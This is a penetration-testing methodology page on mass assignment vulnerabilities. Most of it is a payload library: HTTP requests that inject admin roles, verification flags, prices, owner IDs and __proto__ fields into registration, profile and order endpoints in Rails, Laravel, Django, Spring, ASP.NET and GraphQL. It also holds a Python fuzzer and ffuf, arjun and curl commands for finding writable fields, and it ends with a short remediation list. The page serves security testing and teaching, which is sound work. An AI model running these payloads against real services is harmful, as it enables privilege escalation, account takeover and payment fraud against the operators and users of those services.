---
title: "Mass Assignment"
date: 2026-02-24
draft: false
---

# Mass Assignment

> **Severity**: High | **CWE**: CWE-915
> **OWASP**: A03:2021 – Injection | A01:2021 – Broken Access Control

---

## What Is Mass Assignment?

Mass assignment (also called auto-binding or object injection) occurs when a framework automatically binds HTTP request parameters to model/object properties without an allowlist. If an application exposes a `User` model and the attacker adds `role=admin` or `isAdmin=true` to the request, the ORM may silently set those fields.

The vulnerability is architectural — it exists in the gap between what the API **intends** to accept and what it **actually** binds.

```
Normal registration request:
  POST /api/register
  {"username":"alice","password":"secret"}

Mass assignment attack:
  POST /api/register
  {"username":"alice","password":"secret","role":"admin","verified":true,"credits":99999}

If framework auto-binds all JSON fields to User model → privilege escalation.
```

Vulnerable frameworks with historical mass assignment issues: Rails (before strong parameters), Laravel (without `$fillable`/`$guarded`), Spring MVC (DataBinder without allowlist), ASP.NET MVC (DefaultModelBinder), Mongoose/Node.

---

## Discovery Checklist

**Phase 1 — Map Object Schemas**
- [ ] Register a user → note the fields in the response object (exposed schema)
- [ ] GET `/api/users/me` or `/api/profile` → enumerate all fields in the JSON response
- [ ] Look at API documentation (Swagger/OpenAPI) — identify read-only vs writable fields
- [ ] Compare POST request schema vs GET response schema — extra fields in response = candidates
- [ ] Check JS source and JS bundles for model definitions, form field names, Vuex/Redux store structure
- [ ] Look at error messages — validation errors often reveal field names: `"role is not permitted"` = field exists
- [ ] Monitor network requests from the app's own frontend — does it ever send privilege fields?

**Phase 2 — Identify High-Value Target Fields**
- [ ] `role`, `roles`, `admin`, `isAdmin`, `superuser`, `userType`, `accountType`
- [ ] `verified`, `emailVerified`, `approved`, `active`, `status`
- [ ] `credits`, `balance`, `quota`, `subscription`, `plan`, `tier`
- [ ] `permissions`, `scopes`, `groups`, `team`
- [ ] `_id`, `id` (overwrite existing record), `userId`, `ownerId`
- [ ] `password`, `passwordHash` (set directly without hashing)
- [ ] `createdAt`, `updatedAt`, `deletedAt` (soft delete bypass)

**Phase 3 — Test Injection Points**
- [ ] Registration endpoint — add extra fields
- [ ] Profile update endpoint — add fields not in the form
- [ ] Password reset — add role/privilege fields alongside new password
- [ ] Any PUT/PATCH endpoint — test partial update with injected fields
- [ ] Nested JSON objects — `{"user":{"admin":true},"profile":{...}}`
- [ ] Array parameters — some ORMs bind array index notation: `user[role]=admin`
- [ ] HTTP form data — `username=alice&password=x&role=admin` (URL-encoded body)

---

## Payload Library

### Payload 1 — Basic Field Injection (REST JSON)

```http
# Registration endpoint — try appending privileged fields:
POST /api/v1/users/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "Passw0rd!",
  "role": "admin",
  "isAdmin": true,
  "admin": true,
  "verified": true,
  "emailVerified": true,
  "active": true,
  "status": "approved",
  "permissions": ["*"],
  "subscription": "enterprise",
  "credits": 999999
}

# Profile update — PATCH with injected fields:
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_TOKEN

{
  "displayName": "Alice",
  "role": "admin",
  "isAdmin": true,
  "plan": "premium",
  "balance": 99999,
  "emailVerified": true
}
```

### Payload 2 — Nested Object / Dotted Path Injection

```http
# Some frameworks bind nested JSON objects to nested model relations
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{
  "name": "Alice",
  "address": {"city": "NYC"},
  "user": {
    "role": "admin",
    "admin": true
  }
}

# Rails nested_attributes style:
POST /api/profile HTTP/1.1
Content-Type: application/json

{
  "profile": {
    "bio": "hello",
    "user_attributes": {
      "role": "admin",
      "admin": true
    }
  }
}

# Spring / ASP.NET MVC — dot notation in form data:
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=Alice&user.role=admin&user.admin=true&user.isVerified=true

# PHP / Laravel — array bracket notation:
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=alice&password=secret&role=admin&is_admin=1&user[role]=admin
```

### Payload 3 — Overwrite Record ID / Owner

```http
# Overwrite _id to take over another user's account:
POST /api/users/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "secret",
  "_id": "507f1f77bcf86cd799439011",
  "userId": "VICTIM_USER_ID"
}

# Overwrite ownerId on a created resource:
POST /api/projects HTTP/1.1
Content-Type: application/json
Authorization: Bearer ATTACKER_TOKEN

{
  "name": "My Project",
  "ownerId": "VICTIM_USER_ID",
  "userId": "VICTIM_USER_ID",
  "createdBy": "VICTIM_USER_ID"
}

# Change price/cost field on order submission:
POST /api/orders HTTP/1.1
Content-Type: application/json

{
  "productId": "PROD123",
  "quantity": 1,
  "price": 0.01,
  "totalAmount": 0.01,
  "discount": 99.99
}

# Bypass soft delete:
PATCH /api/records/123 HTTP/1.1
Content-Type: application/json

{
  "name": "test",
  "deletedAt": null,
  "deleted": false,
  "archived": false
}
```

### Payload 4 — Field Enumeration via Fuzzing

```python
#!/usr/bin/env python3
"""
Mass assignment field fuzzer — discover bindable fields via response diffing
"""
import requests, json, copy

TARGET = "https://target.com/api/v1/users/me"
HEADERS = {"Authorization": "Bearer USER_TOKEN", "Content-Type": "application/json"}
BASE_BODY = {"displayName": "test"}

# Common privileged field names to test:
FIELD_CANDIDATES = [
    # Role/privilege
    "role", "roles", "admin", "isAdmin", "superUser", "userType",
    "accountType", "userRole", "accessLevel", "privilege", "permissions",
    # Verification
    "verified", "emailVerified", "phoneVerified", "approved", "active",
    "enabled", "status", "state", "confirm", "isVerified",
    # Financial
    "credits", "balance", "tokens", "quota", "limit", "allowance",
    "subscription", "plan", "tier", "package", "level",
    # Ownership
    "_id", "id", "userId", "ownerId", "createdBy", "updatedBy",
    # Dates
    "createdAt", "updatedAt", "deletedAt", "expiresAt", "trialEnd",
]

# Get baseline response:
baseline = requests.patch(TARGET, headers=HEADERS, json=BASE_BODY)
baseline_body = baseline.json()

print(f"[*] Baseline response: {list(baseline_body.keys())}")

results = {"accepted": [], "rejected": [], "error": []}

for field in FIELD_CANDIDATES:
    for val in [True, "admin", 1, "premium", 99999]:
        body = copy.copy(BASE_BODY)
        body[field] = val
        try:
            r = requests.patch(TARGET, headers=HEADERS, json=body, timeout=10)
            resp = r.json()
            # Field was accepted if it appears in response with our value:
            if field in resp and resp[field] == val:
                print(f"[!!!] MASS ASSIGNMENT: {field}={val} → accepted! Response: {resp[field]}")
                results["accepted"].append((field, val))
                break
            # Or if response changed at all:
            elif resp != baseline_body:
                print(f"[?] Changed response with {field}={val}: {resp}")
        except Exception as e:
            results["error"].append(field)
        break  # Only test first value per field — remove break to test all

print("\n[+] Accepted fields:", results["accepted"])
```

### Payload 5 — Framework-Specific Techniques

```bash
# Rails — identify via X-Powered-By or stack traces
# Strong parameters bypass: look for permit! (permit all) or missing permit:
# Grep app source (if available) for: .permit! or params.require().permit( without your target field
# Test: add field not in permit list → if it's set → mass assignment

# Example: devise registration — common rails vuln:
POST /users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[email]=attacker@evil.com&user[password]=secret&user[admin]=true&user[role]=admin

# Django REST Framework — serializer field injection:
# If serializer uses many=True or has extra_kwargs without read_only:
POST /api/users/ HTTP/1.1
Content-Type: application/json

{"username":"attacker","password":"secret","is_staff":true,"is_superuser":true,"groups":[1,2]}

# Laravel — $fillable bypass via $guarded=[]:
# Test if any field outside $fillable is accepted:
POST /api/register HTTP/1.1
Content-Type: application/json

{"name":"test","email":"t@t.com","password":"secret","is_admin":1,"role_id":1}

# Node.js / Mongoose — if model uses schema.set('strict', false):
# Or if handler does: User.create(req.body) directly:
POST /api/users HTTP/1.1
Content-Type: application/json

{"username":"test","password":"x","__proto__":{"admin":true},"constructor":{"role":"admin"}}

# ASP.NET — DefaultModelBinder bypasses:
POST /Account/Register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

UserName=alice&Password=secret&Roles=Admin&IsApproved=True&IsLockedOut=False

# Spring MVC — @ModelAttribute binding — test with @InitBinder missing:
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&email=alice@corp.com&role=ADMIN&authorities=ROLE_ADMIN
```

### Payload 6 — GraphQL Mass Assignment

```graphql
# GraphQL mutations — inject extra fields in input types:
mutation {
  updateProfile(input: {
    displayName: "Alice"
    role: "admin"
    isAdmin: true
    plan: "enterprise"
    credits: 999999
  }) {
    id
    role
    isAdmin
    credits
  }
}

# Introspection to find input type fields (may be writable but not shown in docs):
{
  __type(name: "UpdateUserInput") {
    fields { name type { name } }
    inputFields { name type { name } }
  }
}

# Also query the output type to compare available fields:
{
  __type(name: "User") {
    fields { name type { name kind } }
  }
}
# Fields in User type that don't appear in any documented mutation = candidate mass assignment fields
```

---

## Tools

```bash
# Arjun — HTTP parameter discovery (finds hidden parameters):
pip3 install arjun
arjun -u https://target.com/api/profile/update -m JSON \
  --headers "Authorization: Bearer TOKEN" \
  --data '{"displayName":"test"}' \
  -oJ arjun_results.json

# Param Miner (Burp extension):
# Right-click request → Guess JSON parameters
# Automatically finds non-standard JSON fields accepted by endpoint

# ffuf — fuzz JSON field names:
ffuf -u https://target.com/api/profile -X PATCH \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"displayName":"test","FUZZ":"admin"}' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fr '"error"' -mc 200

# Manual field enumeration with curl:
for field in role admin isAdmin verified plan credits permissions; do
  response=$(curl -s -X PATCH https://target.com/api/profile \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"displayName\":\"test\",\"$field\":\"admin\"}")
  echo "Field: $field → $(echo $response | python3 -c 'import sys,json; d=json.load(sys.stdin); print(list(d.keys()))')"
done

# Extract model fields from JS bundles — look for form definitions:
curl -s https://target.com/static/app.js | \
  grep -oE '"(role|admin|isAdmin|verified|credits|plan|permissions|balance|subscription)[^"]*"' | sort -u

# Compare registration request fields vs user profile response fields:
# Fields in GET /api/me that weren't in POST /api/register = potential mass assignment targets
curl -s https://target.com/api/me -H "Authorization: Bearer TOKEN" | \
  python3 -c 'import sys,json; print(list(json.load(sys.stdin).keys()))'
```

---

## Remediation Reference

- **Explicit allowlisting**: never bind entire request body to model; always specify which fields are writable — Rails `permit()`, Laravel `$fillable`, DRF serializer `fields`, Spring `setAllowedFields()`
- **Separate input and output DTOs**: use dedicated request objects (`RegisterRequest`) distinct from domain model — do not expose the ORM model directly in API layer
- **Mark sensitive fields read-only**: `@JsonProperty(access = Access.READ_ONLY)` in Jackson, `[JsonIgnore]` in .NET, `readonly` in Mongoose schema
- **Validate privilege field changes**: any field that modifies role/permissions should require elevated auth (admin token, password re-confirmation)
- **Schema-based validation**: use JSON Schema validation on the request body — reject keys not present in the schema definition
- **Audit ORM usage**: grep for `create(req.body)`, `update(req.body)`, `assign(model, params)` — each is a mass assignment risk

*Part of the Web Application Penetration Testing Methodology series.*
